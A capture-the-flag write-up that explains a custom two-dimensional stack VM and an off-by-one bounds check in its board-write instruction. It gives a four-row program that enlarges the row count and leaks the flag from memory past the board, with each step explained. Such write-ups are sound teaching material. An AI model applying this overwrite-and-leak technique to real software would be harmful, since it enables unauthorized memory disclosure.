# Homework Binary Exploitation CTF

## Overview

Target: ```homework```
Source Code: Not Available
Debuggin Symbols: Present
Protections: Not Applicable


## VM

The challenge features a VM that uses a single stack for storage and 2-dimensional grid for instructions.
The instruction pointer can go either left/right or up/down.  It will loop around in the current row/column
when reaching a boundary.  All data on the stack is stored as 4-byte values.

There are instructions that can move data between the stack and board.  Movements from the stack to the board
take only the lower byte.  Movements to the stack from the board zero exetend the value.  All arithmatic
operations only operate on the stack and its top two values.  The first value popped is the RHS value of the operator
the second value popped is the LHS value.

## Instructions

Instructions are one byte values stored on the board.  Any byte that is not a valid instruction is The
equivalent of ```NOP```

### Stack maths

|Hex|Command|Action|
|---|---|---|
|0x21|!|Negate top|
|0x24|$|Remove top|
|x025|%|Mod the top|
|0x2a|*|Multiply the top|
|0x2b|+|Add top|
|0x2d|-|Subtract top|
|0x2f|/|Divide top|
|0x60|`|push(pop() < pop())|

### Misc

|Hex|Command|Action|
|---|---|---|
|0x5c| \ |Swap top two|
|0x3a|:|Duplicate top|
|0x30|0|push(0) (Not allowed if stack has >= 100 things)|
|0x40|@|Exit|

### Interact with the board

|Hex|Command|Action|
|---|---|---|
|0x67|g|Get value from board	push(board[pop() * 0x16 + pop())|
|0x70|p|Put value onto board	board[pop() * 0x16 + pop()] = pop()|


### Print

|Hex|Command|Action|
|---|---|---|
|0x2c|,|Print top as char|
|0x2e|.|Print top as int|

### Movement

|Hex|Command|Action|
|---|---|---|
|0x3c|<|Move instructions left|
|0x3e|>|Move instructions right|
|0x5e|^|Move instructions up|
|0x76|v|Move instructions down|

### Conditional Movement

|Hex|Command|Action|
|---|---|---|
|0x7c|\||If top = 0 move up, else move down			vertical pipe|
|0x5f|_|If top = 0 move right, else move left		horizontal pipe|

## Important Addresses

|Address|Relative Address|Data|
|---|---|---|
|0x001050c0|board-0x1a0|Stack Start|
|0x00105250|board-0x010|Unused|
|0x00105260|board+0x000|Board Start|
|0x001056ab|board+0x44b|Board End|
|0x001056ac|board+0x44c|Rows|
|0x001056b0|board+0x450|Columns|
|0x001056b4|board+0x454|ydir|
|0x001056b8|board+0x458|pcx|
|0x001056bc|board+0x45c|pcy|
|0x001056c0|board+0x460|junk|
|0x001056c4|board+0x464|junk|
|0x001056c8|board+0x468|flag|
|0x00105743|board+0x4e3|flag end|

## Navigating the board

pcx = (pcx + ystep + rows) % rows
pcy = (pcy + xstep + cols) % cols

cols = 0x16
rows = 0x32

The board is initialized to all 0's
The initial direction is xdir = +1 ydir=0

## The Vulnerability

In the logic for moving data from the stack to the board it hits the following switch case:

```
  case 0x70:
    if (sn < 3) {
      __assert_fail("sn >= 3","homework.c",0x79,"step");
    }
    if ((stack[sn + -2] < 0) || (stack[sn + -1] < 0)) {
      __assert_fail("stack[sn-2] >= 0 && stack[sn-1] >= 0","homework.c",0x7a,"step");
    }
    if ((rows < stack[sn + -1]) || (cols < stack[sn + -2])) {
      __assert_fail("stack[sn-1] <= rows && stack[sn-2] <= cols","homework.c",0x7b,"step");
    }
    board[(long)stack[sn + -1] * 0x16 + (long)stack[sn + -2]] = (char)stack[sn + -3];
    sn = sn + -3;
    break;
```

The third check ```(rows < stack[sn + -1]) || (cols < stack[sn + -2])``` is checking that the target row and column is not greater than
the total number of rows and columns.  This creates an off-by-one bug allows writes where ```row == rows```and/or ```col == cols```,
resulting in writes up to one full row beyond the board. This overlaps with the rows variable, stored at row 50 column 0.

## Exploitation

1. Use the ```0!``` opcode to get a non-zero value on the stack.
2. Duplicate the top of the stack and perform arithmatic operations to get ```0x64 0x32 0x00``` on top of the stack.
3. Overwrite the number of rows to a much larger number.
4. Set up the stack with a starting index as high as possible with remaining space.
5. Enter a loop that prints out one char at a time from the board.

## Solution
Row 1 : Setup to write 0x64 to the rows variable\
Row 2 : Write 0x64 to ```rows``` and build 0x16 to write at (0x00, 0x00)\
Row 3 : Write 0x16 to board (0x00, 0x00).  Set the top of the stack to a decently high value below the flag\
Row 4 : Print out one char at a time counting up on the board.  Use the fact that the program will fail after the flag to terminate

```
0!:+:+::*:+::+++:0!vB
:+/0\p0!:+::+::*++v>B
v  *:**:*::+:!0p00<BB
>:!!+:::!:g%\:!:g/g,B
```

### Row 1

```0!:+:+::*:+::+++:0!vB```
#### Explination

The stack is empty so an initial zero needs to be pushed and turned into a 1.  From here arithmatic operations can
turn this 1 into whatever number that is necessary through doubling and addition.  In this case the number 100 will
be written the rows variable.

### Row 2

```:+/0\p0!:+::+::*++v>B```
#### Explination

Here the value 100 is divided by 2 to index into the rows variable since it is at row 50 column 0.  Then the value 100
provides more than enough space to read the flag and can easily be divided to get 50.  From here the value 22, the
number of columns, must be generated for indexing into the board later on.

### Row 3

```vBB*:**:*::+:!0p00<BB```
#### Explination

The value 22 is written to (0, 0) on the board since that location can be read from with the fewest instructions.  Finally 
the stack is prepared with an index variable which is set to a value less than the location of the flag but as high as possible.
This slightly reduces the ammount of junk data read before the flag.

### Row 4

```>:!!+:::!:g%\:!:g/g,B```
#### Explination

This row forms the main memory-leak loop. It increments an index, converts it into (row, col) coordinates using
division and modulo by the column count 22, reads a byte, and prints it. With the modified rows variable
it is possible to read far enough beyond the board to extract the flag.  The loop will continue until 
an out-of-bounds read is attempted which terminates the program.

```>:!!+```
```i = i+1```
The first section begins the loop by changing execution direction increments the index variable stored on the stack.

```:::!:g%\\```
```col = i % 22```
Next the coordinates (0, 0) are genearted to grab the column length saved earlier and calculate the corresponding column index.
```:!:g/```
```row = i / 22```
The row index is calculated similarly using integer division.
```g,B```
```print("%c", board[row*cols + col])```

Finally one byte is extracted and printed as a character before repeating the loop.
